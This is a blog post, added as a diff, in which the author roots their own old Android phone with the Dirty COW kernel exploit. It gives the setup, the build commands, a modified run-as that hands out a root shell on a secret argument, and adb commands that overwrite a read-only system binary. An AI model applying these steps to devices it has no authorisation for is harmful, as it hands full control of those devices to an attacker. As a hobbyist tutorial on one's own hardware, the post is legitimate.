@@ -1,0 +1,143 @@
+---
+layout: post
+title: "Rooting Android with a Dirty COW"
+tags: android root privilege priv-esc dirty-cow
+---
+
+I've recently got a quite old Android phone to play with. I guess the
+first thing to do is getting root, don't you think?<!--more-->
+
+
+## Android SDK
+
+While it is perfectly possible to download the SDK from
+[Android](https://developer.android.com/ndk/guides) and install it by
+hand, I liked the idea to use a package from Debian repository.
+
+To interact with the device we will use [Android Debug
+Bridge](https://developer.android.com/studio/command-line/adb) or `adb`
+for short.
+
+Besides `adb` we need to setup a few `udev` rules so we can run it without
+root permissions.
+
+The package `android-sdk-platform-tools-common` already does that, we
+only need to add our user to the `plugdev` group.
+
+```shell
+$ sudo usermod -aG plugdev $(id -un)
+$ sudo apt-get install adb android-sdk-platform-tools-common
+```
+
+The compiler and the building tools, however, it wasn't so easy.
+
+[google-android-ndk-installer](https://packages.debian.org/source/bullseye/google-android-ndk-installer)
+is available for Bullseye but not for Buster :|
+
+I decided to repackage it:
+
+ - I downloaded the source package
+ - I edited `debian/control` to declare as dependency `debhelper-compat`
+version 12 instead of 13 (which it is for Bullseye)
+ - and finally, I built the `.deb` package with
+`dpkg-buildpackage -rfakeroot -b -uc -us`
+
+`dpkg -i *.deb` and we are done.
+
+## Gathering info
+
+To compile our priv-esc exploit we need to know the architecture
+and SDK version of the phone.
+
+```shell
+$ adb shell getprop ro.product.cpu.abi
+armeabi-nn
+
+$ adb shell getprop ro.build.version.sdk
+nn
+```
+
+I left the connection details for the [official documentation](
+https://developer.android.com/studio/run/device)
+
+## Dirty COW
+
+One of the most reliable modern exploits, the
+[CVE-2016-5195](https://security-tracker.debian.org/tracker/CVE-2016-5195)
+know as [Dirty COW](https://www.youtube.com/watch?v=kEsshExn7aE).
+
+In short, it exploits a race condition in the Copy-on-Write (COW)
+feature in Linux kernel to write in memory pages that are supposed to be
+read-only.
+
+This opens a whole set of opportunities to priv-esc:
+
+ - we could write a `setuid` program with our payload, execute it and
+gain root permissions.
+ - or we could patch `/etc/passwd` or other sensible file.
+
+The beauty is that the exploit is quite easy to understand and read,
+something that it is crucial: you must **never** root your phone blindly
+trusting in an unknown apk or exploit. **Never**.
+
+This [Github
+repository](https://github.com/timwr/CVE-2016-5195/tree/f5671399e040a168307058c598d62de64bb441d8)
+is a PoC for exploiting Dirty COW on Androids. After a few hours of
+reviewing I was confident that it would be safe to use it.
+
+The repository has:
+
+ - `dirtycow.c` which implements the exploit
+ - `dcow.c`, a tiny program interface
+ - `run-as.c` which it uses `selinux` to run as root
+
+I had only modified `run-as.c` a little to call the original *unpatched*
+`run-as` program by default and drop a root shell only under a special
+condition. We don't want that *anyone* can call it and become root!
+
+```cpp
+const char* pkgname;
+if (argc < 2)
+    return 1;
+
+pkgname = argv[1];
+if (strcmp(pkgname, "cookie") != 0) {
+    /* Rollback to the default run-as . */
+    char *argv2[argc+1];
+    memset(argv2, 0, sizeof(char*)*(argc+1));
+    memcpy(argv2, argv, sizeof(char*)*argc);
+
+    execvp("/system/bin/run-as.bck", argv2);
+    return 1;
+}
+```
+
+The [compilation](https://developer.android.com/ndk/guides/ndk-build)
+then went smoothly:
+
+```shell
+$ export PATH=$PATH:/usr/lib/android-sdk/ndk-bundle/
+$ ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./Android.mk APP_ABI=armeabi-nn APP_PLATFORM=android-nn
+```
+
+## Patching
+
+We upload the exploit and our *custom* `run-as` program to the phone:
+
+```shell
+$ adb push libs/armeabi-nn/dirtycow /storage/sdcard0/dcow
+$ adb push libs/armeabi-nn/run-as /storage/sdcard0/run-as
+```
+
+We make a backup copy of the *unpatched* `run-as` program and trigger
+then the exploit. If everything goes well the *read-only* `/system/bin/run-as`
+will be *replaced* with our custom `run-as`:
+
+```shell
+$ adb shell 'cp /system/bin/run-as /storage/sdcard0/run-as.bck'
+$ adb shell '/storage/sdcard0/dcow /storage/sdcard0/run-as /system/bin/run-as --no-pad'
+```
+
+We run `run-as cookie cookie` and we get a root shell; bypassing
+[SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux) will
+be for another post [:D](https://hernan.de/blog/tailoring-cve-2019-2215-to-achieve-root/)
